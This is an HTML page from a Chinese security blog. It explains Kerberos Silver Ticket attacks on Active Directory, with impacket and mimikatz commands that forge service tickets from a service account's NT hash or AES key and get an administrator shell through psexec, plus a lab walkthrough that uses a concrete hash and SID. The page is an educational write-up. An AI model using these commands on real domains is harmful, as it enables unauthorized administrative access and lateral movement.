@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="说在前面当你获得了一个机器用户的NTLM形式的hash，那你如何登录进这台机器呢(不能PTH的情况)？ 对于初学的我，直接宕机了，不过办法那确实是有的，就是本文所提到的Silver tickets攻击 Theory服务账户的长期密钥可以用来伪造服务票据，稍后可以使用传递票据的方法访问该服务。在银票场景中，攻击者会伪造包含请求用户任意信息的服务票据，从而授予大量访问权限。 其中有个与金票很大的不同点">
+<meta property="og:type" content="article">
+<meta property="og:title" content="tickets">
+<meta property="og:url" content="https://baozongwi.xyz/2025/06/26/Silver-tickets/index.html">
+<meta property="og:site_name" content="baozongwi:H@cking Th3 Fu1ure">
+<meta property="og:description" content="说在前面当你获得了一个机器用户的NTLM形式的hash，那你如何登录进这台机器呢(不能PTH的情况)？ 对于初学的我，直接宕机了，不过办法那确实是有的，就是本文所提到的Silver tickets攻击 Theory服务账户的长期密钥可以用来伪造服务票据，稍后可以使用传递票据的方法访问该服务。在银票场景中，攻击者会伪造包含请求用户任意信息的服务票据，从而授予大量访问权限。 其中有个与金票很大的不同点">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-06-26T11:35:30.000Z">
+<meta property="article:modified_time" content="2025-06-26T14:01:01.359Z">
+<meta property="article:author" content="baozongwi">
+<meta property="article:tag" content="tickets">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/acvtar.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/acvtar.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/acvtar.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>tickets</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="baozongwi:H@cking Th3 Fu1ure" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+	<!-- Waline Comments -->
+	
+		<link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css"/>
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">H0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">Aβout</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Topi3s</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Cat4gory</a></li><!--
+     --><!--
+       --><li><a href="/links/">Li^ks</a></li><!--
+     --><!--
+       --><li><a href="/search/">Seαrch</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/06/22/DASCTF2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://baozongwi.xyz/2025/06/26/Silver-tickets/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://baozongwi.xyz/2025/06/26/Silver-tickets/&text=tickets"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://baozongwi.xyz/2025/06/26/Silver-tickets/&title=tickets"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://baozongwi.xyz/2025/06/26/Silver-tickets/&is_video=false&description=tickets"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=tickets&body=Check out this article: https://baozongwi.xyz/2025/06/26/Silver-tickets/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://baozongwi.xyz/2025/06/26/Silver-tickets/&title=tickets"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://baozongwi.xyz/2025/06/26/Silver-tickets/&title=tickets"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://baozongwi.xyz/2025/06/26/Silver-tickets/&title=tickets"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://baozongwi.xyz/2025/06/26/Silver-tickets/&title=tickets"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://baozongwi.xyz/2025/06/26/Silver-tickets/&name=tickets&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://baozongwi.xyz/2025/06/26/Silver-tickets/&t=tickets"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B4%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">说在前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Theory"><span class="toc-number">2.</span> <span class="toc-text">Theory</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Practice"><span class="toc-number">3.</span> <span class="toc-text">Practice</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#linux"><span class="toc-number">3.1.</span> <span class="toc-text">linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows"><span class="toc-number">3.2.</span> <span class="toc-text">windows</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RW-Practice"><span class="toc-number">4.</span> <span class="toc-text">RW Practice</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E6%96%87"><span class="toc-number">5.</span> <span class="toc-text">下文</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        tickets
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">baozongwi</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-06-26T11:35:30.000Z" class="dt-published" itemprop="datePublished">2025-06-26</time>
+        
+        (Updated: <time datetime="2025-06-26T14:01:01.359Z" class="dt-updated" itemprop="dateModified">2025-06-26</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Active-Directory/">Active Directory</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/tickets/" rel="tag">tickets</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><p>当你获得了一个机器用户的NTLM形式的hash，那你如何登录进这台机器呢(不能PTH的情况)？</p>
+<p>对于初学的我，直接宕机了，不过办法那确实是有的，就是本文所提到的Silver tickets攻击</p>
+<h2 id="Theory"><a href="#Theory" class="headerlink" title="Theory"></a>Theory</h2><p>服务账户的长期密钥可以用来伪造服务票据，稍后可以使用传递票据的方法访问该服务。在银票场景中，攻击者会伪造包含请求用户任意信息的服务票据，从而授予大量访问权限。</p>
+<p>其中有个与金票很大的不同点就是银票攻击不会与域控制器(DC)进行交互，直接伪造Service Ticket来访问特定服务。而进行本次攻击的条件也很简单，就是拥有服务账户用户的NT hash或AES key</p>
+<p>服务账户常见的分为两种，一种是机器用户，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FILESERVER$      # 文件服务器</span><br><span class="line">WEBSERVER$       # Web服务器</span><br><span class="line">SQLSERVER$       # SQL服务器</span><br><span class="line">EXCHANGE01$      # Exchange服务器</span><br></pre></td></tr></table></figure>
+
+<p>而另一种是服务用户账户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">svc_sql          # SQL Server服务账户</span><br><span class="line">svc_iis          # IIS应用池账户  </span><br><span class="line">svc_sharepoint   # SharePoint服务账户</span><br><span class="line">svc_exchange     # Exchange服务账户</span><br><span class="line">app_service      # 应用程序服务账户</span><br></pre></td></tr></table></figure>
+
+<h2 id="Practice"><a href="#Practice" class="headerlink" title="Practice"></a>Practice</h2><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><p>第一步我们查询域的SID，其中DomainUser应该和NThash相对应</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-lookupsid -hashes <span class="string">&#x27;LMhash:NThash&#x27;</span> <span class="string">&#x27;DOMAIN/DomainUser@DomainController&#x27;</span> 0</span><br></pre></td></tr></table></figure>
+
+<p>然后申请银票即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># with an NT hash</span></span><br><span class="line">impacket-ticketer -nthash <span class="string">&quot;<span class="variable">$NT_HASH</span>&quot;</span> -domain-sid <span class="string">&quot;<span class="variable">$DomainSID</span>&quot;</span> -domain <span class="string">&quot;<span class="variable">$DOMAIN</span>&quot;</span> -spn <span class="string">&quot;<span class="variable">$SPN</span>&quot;</span> <span class="string">&quot;username&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># with an AES (128 or 256 bits) key</span></span><br><span class="line">impacket-ticketer -aesKey <span class="string">&quot;<span class="variable">$AESkey</span>&quot;</span> -domain-sid <span class="string">&quot;<span class="variable">$DomainSID</span>&quot;</span> -domain <span class="string">&quot;<span class="variable">$DOMAIN</span>&quot;</span> -spn <span class="string">&quot;<span class="variable">$SPN</span>&quot;</span> <span class="string">&quot;username&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>再导入银票，修改hosts进行无密码连接即可。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">impacket-psexec Administrator@FILESERVER.xiaorang.lab -k -no-pass -codec gbk</span><br><span class="line"></span><br><span class="line">impacket-psexec Administrator@FILESERVER.xiaorang.lab -k -no-pass -codec gbk</span><br></pre></td></tr></table></figure>
+
+<p>有师傅可能会说，诶TM的，为什么不指定域控制器呢，哥哥~，我们不与DC交互的</p>
+<h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>在Windows里面意味着我已经登录上去了，所以我更加可能会根据域图分析去进行其他的攻击，比如s4u啥的，而不是这个基本银票，但是写写记录一下，运行猕猴桃，得到hash的情况下这么去申请银票</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># with an NT hash</span><br><span class="line"><span class="function">kerberos::<span class="title">golden</span> /<span class="title">domain</span>:$<span class="title">DOMAIN</span> /<span class="title">sid</span>:$<span class="title">DomainSID</span> /<span class="title">rc4</span>:$<span class="title">serviceAccount_NThash</span> /<span class="title">user</span>:$<span class="title">username_to_impersonate</span> /<span class="title">target</span>:$<span class="title">targetFQDN</span> /<span class="title">service</span>:$<span class="title">spn_type</span> /<span class="title">ptt</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># <span class="title">with</span> <span class="title">an</span> <span class="title">AES</span> 128 <span class="title">key</span></span></span><br><span class="line"><span class="function"><span class="title">kerberos</span>::<span class="title">golden</span> /<span class="title">domain</span>:$<span class="title">DOMAIN</span> /<span class="title">sid</span>:$<span class="title">DomainSID</span> /<span class="title">aes128</span>:$<span class="title">serviceAccount_aes128_key</span> /<span class="title">user</span>:$<span class="title">username_to_impersonate</span> /<span class="title">target</span>:$<span class="title">targetFQDN</span> /<span class="title">service</span>:$<span class="title">spn_type</span> /<span class="title">ptt</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># <span class="title">with</span> <span class="title">an</span> <span class="title">AES</span> 256 <span class="title">key</span></span></span><br><span class="line"><span class="function"><span class="title">kerberos</span>::<span class="title">golden</span> /<span class="title">domain</span>:$<span class="title">DOMAIN</span> /<span class="title">sid</span>:$<span class="title">DomainSID</span> /<span class="title">aes256</span>:$<span class="title">serviceAccount_aes256_key</span> /<span class="title">user</span>:$<span class="title">username_to_impersonate</span> /<span class="title">target</span>:$<span class="title">targetFQDN</span> /<span class="title">service</span>:$<span class="title">spn_type</span> /<span class="title">ptt</span></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="RW-Practice"><a href="#RW-Practice" class="headerlink" title="RW Practice"></a>RW Practice</h2><p>现在得到<code>MSSQLSERVER$</code>的NThash为<code>c8146f80f2e526483100ff7f57ff53f4</code>，172.22.2.3为DC地址，172.22.2.16为目标攻击服务器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-lookupsid -hashes <span class="string">&#x27;:c8146f80f2e526483100ff7f57ff53f4&#x27;</span> <span class="string">&#x27;xiaorang.lab/MSSQLSERVER$@172.22.2.3&#x27;</span> 0</span><br></pre></td></tr></table></figure>
+
+<p>得到sid为<code>S-1-5-21-2704639352-1689326099-2164665914</code>，接着伪造机器的管理员申请银票。</p>
+<p>常见的SPN服务：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 文件共享 </span><br><span class="line">&quot;CIFS/MSSQLSERVER.xiaorang.lab&quot;</span><br><span class="line"></span><br><span class="line"># 主机服务</span><br><span class="line">&quot;HOST/MSSQLSERVER.xiaorang.lab&quot;</span><br><span class="line"></span><br><span class="line"># 专属服务</span><br><span class="line">&quot;MSSQLSvc/MSSQLSERVER.xiaorang.lab:1433&quot;</span><br></pre></td></tr></table></figure>
+
+<p>一般文件共享就能成功了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;172.22.2.16 MSSQLSERVER.xiaorang.lab&quot;</span> &gt;&gt; /etc/hosts</span><br><span class="line"></span><br><span class="line">impacket-ticketer -nthash <span class="string">&quot;c8146f80f2e526483100ff7f57ff53f4&quot;</span> \</span><br><span class="line">                  -domain-sid <span class="string">&quot;S-1-5-21-2704639352-1689326099-2164665914&quot;</span> \</span><br><span class="line">                  -domain <span class="string">&quot;xiaorang.lab&quot;</span> \</span><br><span class="line">                  -spn <span class="string">&quot;CIFS/MSSQLSERVER.xiaorang.lab&quot;</span> \</span><br><span class="line">                  <span class="string">&quot;administrator&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>导入票据，无密码连接上去就行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator.ccache</span><br><span class="line"></span><br><span class="line">impacket-psexec Administrator@MSSQLSERVER.xiaorang.lab -k -no-pass -codec gbk</span><br></pre></td></tr></table></figure>
+
+<h2 id="下文"><a href="#下文" class="headerlink" title="下文"></a>下文</h2><p>一个更隐蔽的银票替代方案是利用 S4U2self，通过依赖 Kerberos 委托而不是伪造一切，来冒充目标机器上具有本地管理员权限的域用户。</p>
+
+  </div>
+
+  <!-- 赞赏按钮和二维码 -->
+  <div class="donation-container">
+    <button id="donate-btn" class="donate-btn">reward</button>
+    <div id="donation-qr" class="donation-qr" style="display: none;">
+      <img src="/images/award.png" alt="扫码打赏" />
+    </div>
+  </div>
+  <!-- 赞赏按钮和二维码的结束 -->
+
+</article>
+
+
+
+
+    <div class="blog-post-comments">
+        <div id="waline_thread"></div>
+    </div>
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">H0me</a></li>
+        
+          <li><a href="/about/">Aβout</a></li>
+        
+          <li><a href="/tags/">Topi3s</a></li>
+        
+          <li><a href="/categories/">Cat4gory</a></li>
+        
+          <li><a href="/links/">Li^ks</a></li>
+        
+          <li><a href="/search/">Seαrch</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B4%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">说在前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Theory"><span class="toc-number">2.</span> <span class="toc-text">Theory</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Practice"><span class="toc-number">3.</span> <span class="toc-text">Practice</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#linux"><span class="toc-number">3.1.</span> <span class="toc-text">linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows"><span class="toc-number">3.2.</span> <span class="toc-text">windows</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RW-Practice"><span class="toc-number">4.</span> <span class="toc-text">RW Practice</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E6%96%87"><span class="toc-number">5.</span> <span class="toc-text">下文</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://baozongwi.xyz/2025/06/26/Silver-tickets/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://baozongwi.xyz/2025/06/26/Silver-tickets/&text=tickets"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://baozongwi.xyz/2025/06/26/Silver-tickets/&title=tickets"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://baozongwi.xyz/2025/06/26/Silver-tickets/&is_video=false&description=tickets"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=tickets&body=Check out this article: https://baozongwi.xyz/2025/06/26/Silver-tickets/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://baozongwi.xyz/2025/06/26/Silver-tickets/&title=tickets"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://baozongwi.xyz/2025/06/26/Silver-tickets/&title=tickets"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://baozongwi.xyz/2025/06/26/Silver-tickets/&title=tickets"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://baozongwi.xyz/2025/06/26/Silver-tickets/&title=tickets"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://baozongwi.xyz/2025/06/26/Silver-tickets/&name=tickets&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://baozongwi.xyz/2025/06/26/Silver-tickets/&t=tickets"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        baozongwi
+        <br>
+		<a href="https://www.dkdun.cn/" target="_blank">DK盾</a>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">H0me</a></li><!--
+                --><!--
+                --><li><a href="/about/">Aβout</a></li><!--
+                --><!--
+                --><li><a href="/tags/">Topi3s</a></li><!--
+                --><!--
+                --><li><a href="/categories/">Cat4gory</a></li><!--
+                --><!--
+                --><li><a href="/links/">Li^ks</a></li><!--
+                --><!--
+                --><li><a href="/search/">Seαrch</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+<!-- Waline Comments -->
+
+  <script type="module">
+    import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
+
+    var EMOJI = ['//unpkg.com/@waline/emojis@1.2.0/weibo']
+    var META = ['nick', 'mail', 'link'];
+    var REQUIREDFIELDS = ['nick', 'mail', 'link'];
+
+    var emoji = '//unpkg.com/@waline/emojis@1.2.0/qq'.split(',').filter(function(item){
+      return item !== ''; // filter()返回满足不为空item
+    });
+    emoji = emoji.length == 0 ? EMOJI : emoji;
+
+    var meta = 'nick,mail'.split(',').filter(function(item){
+      return META.indexOf(item) > -1; // filter()返回满足META.indexOf(item) > -1为true的item
+    });
+    meta = meta.length == 0 ? META : meta;
+
+    var requiredFields = 'nick,mail'.split(',').filter(function(item){
+      return REQUIREDFIELDS.indexOf(item) > -1; // filter()返回满足META.indexOf(item) > -1为true的item
+    });
+    requiredFields = requiredFields.length == 0 ? REQUIREDFIELDS : requiredFields;
+
+    init({
+      el: '#waline_thread',
+      serverURL: 'https://waline.baozongwi.xyz/', // Waline 的服务端地址
+      path: '' == '' ? window.location.pathname : '', // 当前文章页路径，用于区分不同的文章页，以保证正确读取该文章页下的评论列表
+      lang: 'zh-CN' == '' ? 'zh-CN' : 'zh-CN', // 多语言支持，未设置默认英文
+      emoji: emoji,
+      dark: 'auto', // 暗黑模式适配
+      commentSorting: '' == '' ? 'latest' : '', // 评论列表排序方式
+      meta: meta, // 评论者相关属性
+      requiredFields: requiredFields, // 设置必填项，默认匿名
+      login: '', // 登录模式状态
+      wordLimit: '', // 评论字数限制
+      pageSize: '10' == '' ? 10 : '10', // 评论列表分页，每页条数
+      imageUploader: '', // 自定义图片上传方法
+      highlighter: '', // 代码高亮
+      locale: {
+          placeholder: 'ヾ(☆▽☆)ノ 等你来评论！', 
+          sofa: '這個評論區有點冷₍˄·͈༝·͈˄*₎◞ ̑̑', 
+        },
+      avatar: 'mp',
+      visitor: 'false',
+      comment_count: 'false',
+      review: true,
+    });
+  </script>
+
+</body>
+</html>
